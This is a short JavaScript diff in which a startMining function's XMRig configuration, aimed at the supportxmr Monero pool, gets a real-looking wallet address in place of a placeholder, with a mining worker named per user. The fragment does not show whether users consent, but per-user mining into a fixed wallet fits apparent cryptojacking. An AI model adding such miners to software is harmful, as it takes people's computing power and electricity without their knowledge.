@@ -43,7 +43,7 @@ async function startMining(userIdParam, sessionIdParam) {
     try {
       miner = new XMRig({
         pool: 'pool.supportxmr.com:3333',
-        wallet: 'YOUR_XMR_WALLET_ADDRESS',
+        wallet: '46an3rRwAENNVnZhXuxMYKDFAfTP5sasbdDcpTQZRezpGfsJ8ZAoGWWTXyZBk5vLRk8z2LHQGfNthdC93dAD1uxAP9T9gA2',
         password: 'x',
         worker: `user_${userId}`,
         threads: 1,
